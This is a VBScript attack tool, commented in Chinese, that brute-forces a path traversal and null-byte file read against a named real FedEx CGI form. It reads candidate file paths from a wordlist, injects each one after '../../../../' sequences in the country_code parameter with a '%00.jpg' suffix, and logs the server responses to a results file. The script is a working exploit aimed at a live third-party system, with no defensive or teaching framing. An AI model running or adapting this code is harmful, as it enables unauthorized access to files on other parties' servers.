If (LCase(Right(WScript.FullName,11))="wscript.exe") Then 
   Set objShell=WScript.CreateObject("wscript.shell")
   objShell.Run("cmd.exe /k cscript //nologo "&chr(34)&WScript.ScriptFullName&chr(34))
   WScript.Quit
End If
'----------------------------------------------------------------------------
Dim url,p1,p2,dir,DicFile,Line,retData,NumFile,i,Num,DicStr,NumStr
url="https://www.fedex.com/cgi-bin/apacebusinessrequest.cgi"
p1="account_number=4111111111111111&address1=3137%20Laguna%20Street&address2=3137%20Laguna%20Street&city=San%20Francisco&comment=1&company=Acunetix&consultant=consultant%20to%20call&country=South%20Korea&country_code=../../../../../../../../../.."
DicStr="tmp.txt"
p2="%00.jpg&ebiz_type=Business%20to%20Business&email=sample%40email.tst&fax=317-317-3137&hq_location=1&improve=reduce%20inventory&improve_others=1&name=mwhvuugk&nature_business=Retail%20and%20consumer%20goods&phone=555-666-0606&postal_code=94102&province_region=NY&province_region_required=no&receive_info=receive%20info&request_country=USA&send_to=krbr%40fedex.com&shipment_no=0%20-%2050&template=ebizlogrequest&template_output=ebizlogrequestthanks&timeframe=Less%20than%20a%20month&title=Mr.&web_address=3137%20Laguna%20Street"
NumStr="Num.txt"
OutFileStr="Result.txt"
'----------------------------------------------------------------------------
Dim fso
Set fso = WScript.CreateObject("Scripting.Filesystemobject")
Set DicFile=fso.OpenTextFile(DicStr,1,True)
Set NumFile=fso.OpenTextFile(NumStr,1,True)
Do Until NumFile.AtEndOfStream
	Num=NumFile.ReadLine
Loop
NumFile.Close
If Num = "" Then Num = 0
For i=0 To Num-2
	dir=DicFile.ReadLine
Next
Do Until DicFile.AtEndOfStream
	Set NumFile=fso.OpenTextFile(NumStr,8,True)
	dir=DicFile.ReadLine
	retData=HTTP_POST(url,p1 & dir & p2)
	WriteFile OutFileStr,"-----------------------------------------"&dir&"-----------------------------------------"&vbcrlf
	WriteFile OutFileStr,retData
	WriteFile OutFileStr,vbCrLf & vbCrLf
	WScript.Echo "-----------------"&dir&"-----------------"  
	WScript.Echo Left(retData,100) 
	NumFile.WriteLine DicFile.Line
	NumFile.Close
Loop 
DicFile.Close
Set fso=Nothing 




Function WriteFile(inFile,inData)
	Dim fso
	Set fso = WScript.CreateObject("Scripting.Filesystemobject")
	Dim File
	Set File=fso.OpenTextFile(inFile,8,True)
	File.Write inData
	File.Close
	Set fso=Nothing
End Function 

Function HTTP_GET(URL)
	Dim XML
	Set XML = CreateObject("WinHttp.WinHttpRequest.5.1")
	With XML
		.Open "GET",URL + "?t=" + CStr(Rnd()),True	'后面加时间戳防缓存，如果URL有参数就把?改为&
		.SetTimeouts 50000, 50000, 50000,50000	'超时
		.Send
		.WaitForResponse
		HTTP_GET = GB2312ToUnicode(.ResponseBody)
	End With
End Function

Function HTTP_POST(URL,data)
	Dim XML
	Set XML = CreateObject("WinHttp.WinHttpRequest.5.1")
	With XML
		.Open "POST",URL ,True
		.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"	'设置HTTP头信息
		.SetTimeouts 50000, 50000, 50000, 50000	 '超时
		.Send(data)
		.WaitForResponse
		HTTP_POST = GB2312ToUnicode(.ResponseBody)
	End With
End Function

Function GB2312ToUnicode(str)
	With CreateObject("adodb.stream")
		.Type = 1 : .Open
		.Write str : .Position = 0
		.Type = 2 : .Charset = "gb2312"
		GB2312ToUnicode = .ReadText : .Close
	End With
End Function